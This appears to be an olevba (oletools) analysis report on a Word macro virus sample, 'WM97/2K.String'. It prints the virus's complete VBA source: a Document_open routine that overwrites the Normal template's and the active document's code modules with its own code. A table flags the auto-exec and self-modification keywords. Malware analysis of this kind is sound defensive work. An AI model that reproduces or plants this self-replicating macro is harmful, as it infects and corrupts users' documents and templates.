olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.String
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.String - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'e[ax]
Private Sub Document_open()
Dim KVICKJS, CHSJEUR, LCXJSIE, OCKAJRF, SIFDMXU
Set CHSJEUR = ThisDocument.VBProject.VBComponents(1).CodeModule
Set OCKAJRF = NormalTemplate.VBProject.VBComponents(1).CodeModule
Set LCXJSIE = ActiveDocument.VBProject.VBComponents(1).CodeModule
KVICKJS = Strings.Trim(CHSJEUR.lines(1, CHSJEUR.countoflines))
SIFDMXU = Strings.LCase("'e[ax]")
If SIFDMXU <> OCKAJRF.lines(1, 1) Then
With OCKAJRF
.deletelines 1, OCKAJRF.countoflines
.insertlines 1, KVICKJS
End With
End If
If SIFDMXU <> LCXJSIE.lines(1, 1) Then
With LCXJSIE
.deletelines 1, LCXJSIE.countoflines
.insertlines 1, KVICKJS
End With
End If
'WM97/2K.String by e[ax]
'SIM v1.0 [String Infection Method] by e[ax]
'Greetz: k04x, rudeboy, BIGFOOOT, E-man, SnakeLord, t[r]ax
'H4dija, te ostale pri BIHnet.ORG-u
'SP.greetz to: Jackie 2Fl0wer, KnowDeth, ASMhead, Mist, mort-
'nala, Giga, LifeWire, Fulvian, Evul, and to all ppl on #virus
'10x once again for inspiration...
'VicES: Where ar u man!?
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

